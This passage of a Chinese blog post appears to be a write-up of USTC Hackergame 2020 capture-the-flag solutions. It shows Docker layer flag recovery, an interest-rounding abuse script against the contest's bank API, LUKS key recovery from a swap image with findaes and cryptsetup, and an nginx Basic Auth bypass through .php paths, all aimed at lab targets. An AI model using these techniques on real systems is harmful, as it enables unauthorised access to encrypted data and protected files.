class=\"hljs-string\">\"Failed!\"</span>)<span class=\"hljs-comment\"># runner.py</span><span class=\"hljs-built_in\">exec</span>(<span class=\"hljs-built_in\">input</span>())</code></pre>\n<blockquote><p>不要想着直接 <code>exec()</code> 偷 flag 了，你以为这比赛是 ylb 搞的啊？</p></blockquote>\n<p>可以看到「反向复读」的检查中使用了 <code>[::-1]</code> 倒序，所以在构造反向复读的语句中也应该使用 <code>[::-1]</code>。</p>\n<p>首先是构建正向复读的语句，在 Google 中 <del>盲目</del> 搜索的过程中确定了关键词「Quine Python」、找到了 <a href=\"https://www.geeksforgeeks.org/quine-in-python/\">这个网站</a>，介绍了如下语句：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">'_=%r;print (_%%_)'</span>;<span class=\"hljs-built_in\">print</span> (_%_)</code></pre>\n<p>那个网站也给出了这个语句的详细解释，不过简单来说，我们利用了 <code>print</code> 字符格式化、通过 <code>%r</code>（当然也可以用 <code>%s</code>）获得 <code>_</code> 变量的取值；而在 <code>_</code> 变量中使用了 <code>%%</code> 防止 <code>%</code> 被转义。</p>\n<p>既然有了正向复读，稍加改动即可得到反向复读。首先在 <code>print(_&amp;_)</code> 中加上 <code>[::-1]</code> 获得倒叙，同时也要对应修改 <code>_</code> 变量：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>])</code></pre>\n<p>信心满满地去提交，结果 Check Failed，发现 <code>print</code> 在结尾带上了换行符。所以再为 <code>print</code>再加上 <code>end=\"\"</code> 即可：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')\"\"=dne,]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>],end=<span class=\"hljs-string\">\"\"</span>)</code></pre>\n<p>成功获得第一个 flag。</p>\n<h2>233 同学的字符串工具</h2>\n<blockquote>\n<p>233 同学最近刚刚学会了 Python 的字符串操作，于是写了两个小程序运行在自己的服务器上。这个工具提供两个功能：</p>\n<ul>\n<li>字符串大写工具</li>\n<li>UTF-7 到 UTF-8 转换工具</li>\n</ul>\n<p>除了点击下方的打开题目按钮使用网页终端，你也可以通过 <code>nc 202.38.93.111 10233</code> 命令连接到 233 同学的服务上。你可以在这里看到 233 同学的源代码: <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-string_tool-py\">string_tool.py</a>。</p>\n</blockquote>\n<p>这一道题我先拿到了第二个 flag 后才拿到了第一个 flag。首先在 <code>www.string-function.com</code> 这个网站上找到了 UTF-7 和 ASCII 编码互换表： <a href=\"http://string-functions.com/encodingtable.aspx?encoding=65000&amp;decoding=20127\">UTF-7 =&gt; ASCII</a> <a href=\"http://string-functions.com/encodingtable.aspx?encoding=20127&amp;decoding=65000\">ASCII =&gt; UTF-7</a>，照着表（加上一些简单的推算）将 <code>flag</code> 编码成 <code>+AGYAbABhAGc-</code>、成功拿到第二个 flag。</p>\n<p>获得第二个 flag 以后，决定根据相同的思路去查 Unicode sheet，但是直到后来经过提醒才想起来有「<a href=\"https://en.wikipedia.org/wiki/Orthographic_ligature\">合字</a>」这种神奇的存在，最终利用 <a href=\"https://www.compart.com/en/unicode/U+FB02#UNC_DB\"><code>U+FB02</code></a> 构造出 Payload 获得第一个 flag。</p>\n<h2>233 同学的 Docker</h2>\n<blockquote>\n<p>233 同学在软工课上学到了 Docker 这种方便的东西，于是给自己的字符串工具项目写了一个 Dockerfile。</p>\n<p>但是 233 同学突然发现它不小心把一个私密文件（<code>flag.txt</code>）打包进去了，于是写了一行命令删掉这个文件。</p>\n<p>「既然已经删掉了，应该不会被人找出来吧？」233 想道。</p>\n</blockquote>\n<p>首先让我们 <a href=\"https://hub.docker.com/layers/8b8d3c8324c7/stringtool/latest/images/sha256-aef87a00ad7a4e240e4b475ea265d3818c694034c26ec227d8d4f445f3d93152?context=explore\">看看这个 Docker Image 是怎么构建的</a>（不需要用 image 反推 Dockerfile 这种奇技淫巧，DockerHub 可以直接查看 Public 的 Docker Images 的构建过程），可以发现 233 同学首先把所有文件都添加到 Docker Image 中、再通过 <code>/bin/sh -c rm /code/flag.txt</code> 删除了 <code>flag.txt</code>。</p>\n<p>由于 Docker Image 在构建时每一个 RUN 都会新建一个 Layer，因此即使 233 同学通过 RUN 删掉了 <code>flag.txt</code>，flag 肯定还存在于某个地方，而且「某个地方」就包括本机的 <code>/var/lib/docker/overlay2</code> ：</p>\n<pre><code class=\"hljs bash\">$ docker run 8b8d3c8324c7/stringtool <span class=\"hljs-comment\"># 下载执行 8b8d3c8324c7/stringtool</span>[Redacted]Nothing here... <span class=\"hljs-comment\"># Docker Image 执行的输出</span>$ <span class=\"hljs-built_in\">cd</span> /var/lib/docker/overlay2$ find -name flag.txt./befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/flag.txt./8c07cc3c01c52b8cf0684518e68a31bfb1f843392f973fef9add587d554c6fab/diff/code/flag.txt<span class=\"hljs-comment\"># Duang，flag.txt 它出现了</span>$ <span class=\"hljs-built_in\">cd</span> befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/$ cat flag.txt<span class=\"hljs-comment\"># flag 到手，嘿嘿</span></code></pre>\n<h2>从零开始的 HTTP 链接</h2>\n<blockquote>\n<p>众所周知，数组下标应当从 0 开始。</p>\n<p>同样的，TCP 端口也应当从 0 开始。为了实践这一点，我们把一个网站架设在服务器的 0 号端口上。</p>\n<p>你能成功连接到 0 号端口并拿到 flag 吗？</p>\n<p><strong>点击下面的打开题目按钮是无法打开网页的，因为普通的浏览器会认为这是无效地址。</strong></p>\n</blockquote>\n<p>TCP/IP 中「端口」这个概念，甚至早于互联网的发明：早在 ARPANET 网中的供电协议中就有 8 个比特用于决定应该由计算机上的哪个程序接收该信息（当时这 8 个比特被称为 AEN、Another Eight Numbers），可以参考我之前翻译的一篇文章「<a href=\"https://blog.skk.moe/post/history-of-url/\">URL 的历史</a>」。现在 TCP 的端口共有 16 个比特（最大支持到 65535）。其中，端口 0 作为保留端口，所以依然是可用的。虽然部分浏览器无法访问，这并不意味着 netcat 不能访问，对吧！</p>\n<p>当然这道题有几个坑点：</p>\n<ol>\n<li>现有发行版中分发的 <code>netcat</code> 都不是「原版」的，试图连接 Port 0 会报「Invalid Port」。因此可以选择直接手撸 Socket、或者更换另一个版本的 <code>netcat</code>。</li>\n<li>就算使用了合适的工具，由于 Darwin 的 XNU Kernel 非常鸡贼地阻止使用端口 0，所以在 macOS 上也依然没法做这道题。我不得不在 codeanywhere 上开了一个 Linux Container 跑这道题。</li>\n</ol>\n<p>和 HTTP/2 基于二进制帧不同，HTTP/0.9、HTTP/1.0、HTTP/1.1 协议都是基于明文的，因此可以手敲 Header：</p>\n<pre><code class=\"hljs bash\">nc 202.38.93.111 0GET / HTTP/1.1Host: 202.38.93.111Connection: close</code></pre>\n<p>接着终端里会打印出来一串 HTML、隐约还可以看见 <code>xterm.js</code>，这不就是 Hackergame 的 Web 端做题界面嘛！由于去年在参与 USTC Hackergame 时就研究过这个界面、已经知道交互是通过 <code>/shell</code> 路径下的 WebSocket 连接实现的。因此直接使用 <a href=\"https://github.com/vi/websocat\">websocat</a> 完成 WebSocket 交互，就和 netcat 一样：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 如果没有 websocat 的话</span>$ wget https://github.com/vi/websocat/releases/download/v1.6.0/websocat_nossl_amd64-linux$ chmod +x websocat_nossl_amd64-linux<span class=\"hljs-comment\"># 开始获取 Flag</span>$ ./websocat_nossl_amd64-linux ws://202.38.93.111:0/shellPlease input your token: [Redacted]<span class=\"hljs-comment\"># Flag 到手！</span></code></pre>\n<h2>超简陋的 OpenGL 小程序</h2>\n<blockquote>\n<p>年轻人的第一个 OpenGL 小程序。</p>\n<p>（嗯，有什么被挡住了？）</p>\n</blockquote>\n<p><a href=\"https://archive.org/details/glhackergame_2020\">下载地址</a> （Hosted at Internet Archive）</p>\n<p>由于苏卡卡是参赛的两千多名选手中最菜的那一个、完全不懂 OpenGL、完全不懂图形学，为了做这道题不得不去翻了一下「Learn OpenGL CN」，知道了 VS（Vertex Shader）是顶点着色器、可以处理顶点属性确定形状，和 FS（Fragment Shader）是片段着色器、可以算颜色，然后就开始硬上了。在花了半个小时盲目乱改 VS 的参数后，成功让「犹抱琵琶半遮面」的 flag 露出了右上角：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/16.jpg\" width=\"1280\" height=\"571\" class=\"lazy post-img\"></p>\n<p>凭借着漏出来的部分，我成功认出了 <code>l</code>、<code>Graphic</code>、<code>Happy</code>、<code>(233);</code>。剩下的就要靠猜了，我猜过的 flag 有：</p>\n<ul>\n<li>\n<code>flag{GraphicHappy(223);}</code> （整体长度都不对）</li>\n<li>\n<code>flag{GraphicsHappy(223);}</code> （ <code>c</code> 和 <code>H</code> 之间还有个类似 <code>c</code> 的字母、那就是 <code>s</code> 了，不过还是不够长）</li>\n<li>\n<code>flag{gl_GraphicsHappy(223);}</code> （OpenGL 里不少 <code>gl_</code> 前缀，加上认出来一个 <code>l</code>，试试看）</li>\n<li>\n<code>flag{glGraphicsHappy(223);}</code> （<code>l</code> 和 <code>G</code> 之间的距离没那么长，终于猜对了）</li>\n</ul>\n<blockquote><p>这道题的正确解法是利用未被使用的向量 <code>Normal</code>。苏卡卡虽然有注意到 Normal 未被使用过，但是由于完全不会 OpenGL、并不知道怎么添加向量。</p></blockquote>\n<p>这种解法没什么好自豪的，你看这只大尾巴狐狸就是逊啦。</p>\n<h2>来自未来的信笺</h2>\n<blockquote>\n<p>你收到了一封邮件。没有标题，奇奇怪怪的发件人，和一份奇怪的附件。日期显示的是 3020 年 10 月 31 日。</p>\n<p>“Send from Arctic.” 正文就只有这一句话。</p>\n<p>「谁搞的恶作剧啊……话说这竟然没有被垃圾邮件过滤器过滤掉？」你一边嘟囔着一边解压了附件——只看到一堆二维码图片。</p>\n<p>看起来有点意思。你不禁想试试，能否从其中得到什么有意义的东西。</p>\n</blockquote>\n<p>谁会在 1000 年以后从北极给你发一封电子邮件？那当然是 <a href=\"https://archiveprogram.github.com/\">GitHub Archive Program</a> 啦 —— 今年年初，GitHub 将现存的活跃开源项目全部以二维码的形式刻录在胶片上、埋进了北极世界档案馆（AWA，位于斯瓦尔巴群岛一个位于北极冻土之下的废弃煤矿中，和 Global Seed Vault 仅一英里之遥）中。为了做这道题，让我们读一读 GitHub Archive Program 为「后人」提供的指南：</p>\n<ul>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE.md\">A Guide To the GitHub Code Vault</a>」</p></li>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE_zh.md\">GitHub Code Vault 指南（简体中文）</a>」</p></li>\n</ul>\n<p>这里摘抄简体中文版指南的一部分内容：</p>\n<blockquote>\n<p>每个二维码由一个个白色或黑色小方块组成，该等小方块几乎占据胶片的整个帧。 使用二维码的原因在于，其比人类可读的文本更紧凑而可靠。 二维码可解码为二进制数据，即一系列 1 和 0。</p>\n<p>……</p>\n<p>我们可将 TAR 文件嵌套进 TAR 文件，就像在容器中装入另一容器，而这正是大部分存档数据的存储方式。 无论哪个仓库，其外层 TAR 文件都将至少包含如下内容：</p>\n<ul>\n<li>一个名为 META 的未压缩元数据文件，其包含仓库名称、帐户名、说明、语言、星数、复刻数</li>\n<li>一个名为 COMMITS 的压缩文件（如下所述），包含该仓库有史以来的更改记录</li>\n<li>一个名为 repo.tar.xz 的文件，是包含实际仓库内容的压缩 TAR 文件</li>\n</ul>\n<p>其它诸如 wiki、gh-page、issue 和 pull request 等元数据也可能包含在不同压缩文件中。</p>\n</blockquote>\n<p>现在我们知道了这些二维码是什么、二维码们中存储了什么数据、数据的格式，接下来就该写一个脚本把所有二维码全部解析出来了：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> zxing<span class=\"hljs-keyword\">import</span> osreader = zxing.BarCodeReader()<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">parseQRCode</span>(<span class=\"hljs-params\">img_path</span>):</span>    barcode = reader.decode(img_path).encode().decode(<span class=\"hljs-string\">'ascii'</span>)    <span class=\"hljs-keyword\">try</span>:        <span class=\"hljs-keyword\">return</span> barcode.raw    <span class=\"hljs-keyword\">except</span>:        <span class=\"hljs-built_in\">print</span>(img_path, barcode)        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">\"\"</span><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">listDirImages</span>(<span class=\"hljs-params\">folder</span>):</span>    imgs = []    <span class=\"hljs-keyword\">for</span> img_path <span class=\"hljs-keyword\">in</span> os.listdir(folder):        ext = os.path.splitext(img_path)        <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">len</span>(ext) &gt; <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> ext[<span class=\"hljs-number\">1</span>].lower() == <span class=\"hljs-string\">\".png\"</span>:            imgs.append(img_path)    imgs.sort()    <span class=\"hljs-keyword\">return</span> imgscontents = []<span class=\"hljs-keyword\">for</span> img <span class=\"hljs-keyword\">in</span> listDirImages(<span class=\"hljs-string\">\"./\"</span>):    contents.extend(parseQRCode(img))file = <span class=\"hljs-string\">\"./result.txt\"</span><span class=\"hljs-keyword\">with</span> <span class=\"hljs-built_in\">open</span>(file, <span class=\"hljs-string\">\"w\"</span>) <span class=\"hljs-keyword\">as</span> f:    <span class=\"hljs-keyword\">for</span> c <span class=\"hljs-keyword\">in</span> contents:        f.write(c)</code></pre>\n<blockquote><p>这道题对二维码解码库的选择非常关键。<code>zybar</code> 已经八年没有更新，不仅无法处理 Binary Format QRCode、而且还无法识别 00 截断；相比来说，<code>zxing</code> 库的维护非常活跃、因而更为可靠。不过即使使用 py-zxing 也有坑，很快就会看到了。</p></blockquote>\n<p>把脚本丢到二维码目录下执行，跑完了打开 <code>result.txt</code>，看到了 <code>META</code>（一个 <code>openlug/django-common</code> 的 GitHub RESTful API 返回值）、<code>COMMITS</code>，甚至还看到了一条 commit message「There’s no flag in META and COMMITS!」。但是到了 <code>repo.tar.xz</code> 却让我伤破脑筋：zlib 的文件头本应该是 <code>FD 37 7A 58</code>，结果却看到了 <code>EF BF BD 37 7A 58</code>，解压软件一个都认不出来。</p>\n<p>这是啥玩意？遇事不决问 Google，结果找到了这个：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/20.png\" width=\"829\" height=\"601\" class=\"lazy post-img\"></p>\n<blockquote><p>[狐狐脏话删除]</p></blockquote>\n<p>接下来就是去魔改 zxing 了。如之前所说，python-zxing 还只是个 Java zxing 的 wrapper，不得不去学了一点 Java 把 zxing 里的 UTF-8 干掉，最终重新解析了一遍二维码、拿到了正确的 <code>repo.tar.xz</code>，解压拿到了 flag。</p>\n<blockquote><p>顺便说一句，做完这道题后有点无聊，开始通过 META 反推原始仓库。原本看到 <code>openlug/nonexist</code>，以为出题人是新建了一个 Private Repo 出的题，但是又看到 <code>fork_count</code> 和 <code>network_count</code> 是 5，所以得出结论这肯定是一个 Public Repo（否则不可能有 Fork）。再根据 Star 数在 30 左右、Watch 数（在 GitHub RESTful API 中通过 <code>subscriber_count</code> 呈现）是 1、语言是 Python， 最后反推出 META 信息源自去年「被泄露的姜戈」的 <code>openlug/django-common</code>，生成 META 的方式就是 <code>curl https://api.github.com/repos/openlug/django-common</code>。结果还被组委会 diss 了，大尾巴狐狐非常不高兴。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.0/32.png\" width=\"1067\" height=\"247\" class=\"lazy post-img\"></p>\n<h2>狗狗银行</h2>\n<blockquote><p>你能在狗狗银行成功薅到羊毛吗？</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/6.png\" width=\"1009\" height=\"593\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/7.png\" width=\"988\" height=\"581\" class=\"lazy post-img\"></p>\n<p>考虑到题目公告更新提示「本题前端计算存在浮点数导致的计算误差，数字特别极端时显示可能不正确。但后端采用大整数精确计算，只有净资产确实高于 2000 时才会给出 flag」，所以这道题的思路和 前年 USTC Hackergame 2018 的猫咪银行借助 INT64 溢出 肯定是不一样的。</p>\n<p>首先观察题目给出的条件：每天都要花 10 块钱吃饭；信用卡利率 0.5%、并且一旦欠款每天利息至少是 10 块钱；储蓄卡利率 0.3%。光从字面上的数字来看似乎这道题做不出来，但是我们知道，阿里蚂蚁金服的「余额宝」产品存在「每天收益不足 1 分钱时按 1 分钱计算」的规则。狗狗银行的储蓄卡利率是否也有类似的规则呢？办一张新的「储蓄卡 3」，从「储蓄卡 1」转 166 块钱到「储蓄卡 3」，「储蓄卡 3」的日利息仍然是 0；再从「储蓄卡 1」转 1 块钱到「储蓄卡 3」使余额变成 167 块，Bingo！现在「储蓄卡 3」的日利息有 1 块钱了。<code>1 / 167</code> 算出来真实的日利率是 0.5988%，比信用卡的利率要高 0.0988%，因此我们可以从信用卡借钱然后赚利息的差价，当然还要考虑到每天至少要净赚 10 块的饭钱、以及信用卡的复利（利滚利）。</p>\n<p>接下来就是用脚本连续开一万张卡试图一天拿到 flag，然后，三台备用服务器（一个 IP 上三个端口、三个 Docker）全部 RST 了。。。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/13.png\" width=\"782\" height=\"905\" class=\"lazy post-img\"></p>\n<p>之后，题目新增了一条公告：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/15.png\" width=\"690\" height=\"94\" class=\"lazy post-img\"></p>\n<p>苏卡卡才不是故意的呢（摇尾巴），<del>苏卡卡只是坏，一天赚 1000 不香嘛</del>；虽然有了 1000 张卡的限制，获取 flag 还是轻而易举的：</p>\n<pre><code class=\"hljs js\">(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> commonFetchOpt = {    <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>, <span class=\"hljs-attr\">mode</span>: <span class=\"hljs-string\">'cors'</span>, <span class=\"hljs-attr\">credentials</span>: <span class=\"hljs-string\">'include'</span>,    <span class=\"hljs-attr\">headers</span>: {      <span class=\"hljs-attr\">Authorization</span>: <span class=\"hljs-string\">'Bearer [选手 Token]'</span>,      <span class=\"hljs-string\">'Content-Type'</span>: <span class=\"hljs-string\">'application/json; charset=utf-8'</span>    }  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{'credit'|'debit'}</span> <span class=\"hljs-variable\">type</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">createCard</span>(<span class=\"hljs-params\">type = <span class=\"hljs-string\">'debit'</span></span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/create'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ type }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">from</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">to</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">amount</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">transfer</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">from</span>, to, amount</span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/transfer'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ amount, <span class=\"hljs-attr\">dst</span>: to, <span class=\"hljs-attr\">src</span>: <span class=\"hljs-keyword\">from</span> }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">account</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">eatAndEndTheDay</span>(<span class=\"hljs-params\">account</span>) </span>{    <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/eat'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ account }),      ...commonFetchOpt    });  }  <span class=\"hljs-keyword\">try</span> {    <span class=\"hljs-comment\">// 开一张信用卡</span>    <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'credit'</span>);    <span class=\"hljs-comment\">// 开 999 张储蓄卡，并给每张新开的储蓄卡转 167 块钱</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">3</span>; i &lt; <span class=\"hljs-number\">1002</span>; i++) {      <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'debit'</span>);      <span class=\"hljs-keyword\">await</span> transfer(<span class=\"hljs-number\">2</span>, i, <span class=\"hljs-number\">167</span>);    }    <span class=\"hljs-comment\">// 用储蓄卡 1 的初始资金 1000 度过 14 天</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">0</span>; i &lt; <span class=\"hljs-number\">14</span>; i++) {      <span class=\"hljs-keyword\">await</span> eatAndEndTheDay(<span class=\"hljs-number\">1</span>);    }    <span class=\"hljs-comment\">// 14 天肯定能赚够 1000 块钱了，该获取 flag 了</span>    <span class=\"hljs-keyword\">const</span> req = <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/user'</span>, { ...commonFetchOpt, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> });    <span class=\"hljs-keyword\">const</span> resp = <span class=\"hljs-keyword\">await</span> req.json();    <span class=\"hljs-built_in\">console</span>.log(resp.flag);  } <span class=\"hljs-keyword\">catch</span> (e) {    <span class=\"hljs-built_in\">console</span>.error(e);  }})();</code></pre>\n<h2>超基础的数理模拟器</h2>\n<blockquote><p>……<br>我们在 Hackergame 2020 的网站上部署了一项超基础的数理模拟器。 作为一名数理基础扎实的同学，你一定能够轻松通过模拟器的测试吧。</p></blockquote>\n<p>打开题目后发现要做 400 道定积分，而且答案还要取小数点后六位：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.8/29.png\" width=\"1497\" height=\"412\" class=\"lazy post-img\"></p>\n<p>这道题没有取巧的办法，只有老老实实把 400 道定积分全部做完…..吧？</p>\n<p>这么长的定积分谁手算啊，当然是要用 MatLab 来算啦！徒手转换 LaTex 到 MathLab 太麻烦了，写个脚本来做吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/27.png\" width=\"1150\" height=\"420\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/28.png\" width=\"1146\" height=\"539\" class=\"lazy post-img\"></p>\n<p>UserScript 在 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-js\">这里</a>，好孩子千万不要学习这种方法来解析 LaTex。</p>\n<h2>室友的加密硬盘</h2>\n<blockquote>\n<p>「我的家目录是 512 位 AES 加密的，就算电脑给别人我的秘密也不会泄漏……」你的室友在借你看他装着 Linux 的新电脑时这么说道。你不信，于是偷偷从 U 盘启动，拷出了他硬盘的一部分内容。</p>\n<p><a href=\"https://archive.org/details/roommates_disk_part.img\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>苏卡卡一开始试图把镜像直接挂载在虚拟机上，结果无法启动系统；于是先起了一个 Linux 虚拟机、在 Linux 下将 img 转换为 vmdk 再添加到虚拟机中，结果依然提示「未找到已安装的操作系统或操作系统安装器」。</p>\n<blockquote><p>中国民航于 1992 年在《中国民用航空局关于确保飞行安全的命令》文件中提出了 54 个字「八该一反对」，其中最重要的就是「反对盲目蛮干」</p></blockquote>\n<p>既然通过 img 文件直接启动没有成功，不如先看看这个 img 文件都有什么：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/18.png\" width=\"824\" height=\"864\" class=\"lazy post-img\"></p>\n<blockquote><p>不要在意这个 Ubuntu Kylin，最近狐狐在虚拟机里各种体验各种「国产 Linux 发行版」，虚拟机里正好有 Ubuntu Kylin 所以拿来用的。</p></blockquote>\n<p>由于之前阅读过一些通过内存转储破解全盘加密的文章，所以便去下载了 <a href=\"https://sourceforge.net/projects/findaes/\">findaes</a> 的源码，编译的同时再去重读之前的几篇文章获取思路。看到几篇文章中都是用 findaes 直接读取 raw 的内存转储，于是决定直接用 findaes 爆破硬盘映像文件。首先把 img 用 7z 解压出来，然后一个一个分区映像跑：</p>\n<pre><code class=\"hljs bash\">$ ./findaes /path/to/img1.raw</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/19.jpg\" width=\"867\" height=\"480\" class=\"lazy post-img\"></p>\n<p>根据题干「我的家目录是 512 位 AES 加密的」，但是 findaes 找到的都是 AES-256，所以需要从中筛选出一对 offset 相差为 256bit 的 key 进行拼接，因此还需要注意一点，由于 Intel x86_64 的 little-endian、拼接 key 时需要倒序拼接。</p>\n<blockquote><p>其实这一点我还是比较熟悉的，安装 Hackintosh 时注入十六进制的设备属性时需要互换 bit 也是因为 little-endian。</p></blockquote>\n<p>剩下的就是一对一对 key 的用 <code>sudo cryptsetup luksAddKey --master-key-file</code> 试过去，直到成功解密为止。最后用 swap 里的最后一对 key 成功解密了分区并拿到了 flag <code>flag{lets_do_A_c01d_b00t_next_time}</code> （下次试试冷启动吧！），直到看到 flag 才明白本题的思路是 Linux 休眠后会把内存写入 swap 分区中（macOS 则是写入硬盘上的 <code>sleepimage</code> 文件中），因此和之前读过的从内存转储破解全盘加密的思路是完全一致的。最后再给大家推荐 Red Hat 知识库的一篇文章「<a href=\"https://access.redhat.com/solutions/1543373\">How to recover lost LUKS key or passphrase</a>」。</p>\n<h2>超简易的网盘服务器</h2>\n<blockquote>\n<p>…… 小 C 开始思考技术方案：“听说 h5ai 搭建云盘的方案是不错的 … 使用 Basic Auth 可以做访问控制，可以保护<a href=\"http://202.38.93.111:10120/\">根目录</a>下的文件不被非法的访问 … 等等，有一些文件是可以被分享的，需要一个 <a href=\"http://202.38.93.111:10120/Public\">/Public</a> 目录来共享文件！”</p>\n<p>三分钟后，小 C 同学完成了网盘的搭建。他想：“空着总不好，先得在云盘上放点东西！”。犹豫片刻，他掏出了自己珍藏了三个月的 flag 并上传到了云盘的<a href=\"http://202.38.93.111:10120/\">根目录</a>。</p>\n</blockquote>\n<p>这道题我好像是第五个还是第六个解出来的。这道题很多人没做出来还是有点令我惊讶的。</p>\n<p>直接访问「根目录」会提示 401 需要 HTTP Basic Authentication，聪明的 小 C 肯定不会把密码直接暴露出来的。访问 <code>/Public </code>目录却发现了 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_nginx-conf\"><code>dockerfile</code></a> 和 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_dockerfile\"><code>nginx.conf</code></a> 文件。从 dockerfile 中我们可以知道小 C 是怎么搭建的服务，而 <code>nginx.conf</code> 更值得我们关心（已省去无关紧要的部分）：</p>\n<pre><code class=\"hljs nginx\"><span class=\"hljs-attribute\">index</span> index.php index.html /_h5ai/public/index.php;<span class=\"hljs-comment\"># 根目录是私有目录，使用 basic auth 进行认证，只有我（超极致的小 C)自己可以访问</span><span class=\"hljs-attribute\">location</span> / {    <span class=\"hljs-attribute\">auth_basic</span> <span class=\"hljs-string\">\"easy h5ai. For visitors, please refer to public directory at `/Public!`\"</span>;    <span class=\"hljs-attribute\">auth_basic_user_file</span> /etc/nginx/conf.d/htpasswd;}<span class=\"hljs-comment\"># Public 目录是公开的，任何人都可以访问，便于我给大家分享文件</span><span class=\"hljs-attribute\">location</span> /Public {    <span class=\"hljs-attribute\">allow</span> all;    <span class=\"hljs-attribute\">index</span> /Public/_h5ai/public/index.php;}<span class=\"hljs-comment\"># PHP 的 fastcgi 配置，将请求转发给 php-fpm</span><span class=\"hljs-attribute\">location</span> <span class=\"hljs-regexp\">~ \\.php$</span> {         <span class=\"hljs-attribute\">fastcgi_pass</span>   <span class=\"hljs-number\">127.0.0.1:9000</span>;         <span class=\"hljs-attribute\">fastcgi_index</span>  index.php;         <span class=\"hljs-attribute\">fastcgi_param</span>  SCRIPT_FILENAME  $document_root$fastcgi_script_name;         <span class=\"hljs-attribute\">include</span>        fastcgi_params;}</code></pre>\n<p>由于 Nginx 配置文件不是连续匹配，因此访问 <code>.php</code> 结尾的路径是不会触发 401 HTTP Basic Auth 的（应该没有人会天真地试图获取 <code>/etc/nginx/conf.d/htpassword</code> 吧？）。既然如此，我们为什么不直接访问 <code>h5ai</code> 的 <code>index.php</code> 呢？首先让我们请求一下 <code>/Public</code> 目录下的 h5ai 后台页面 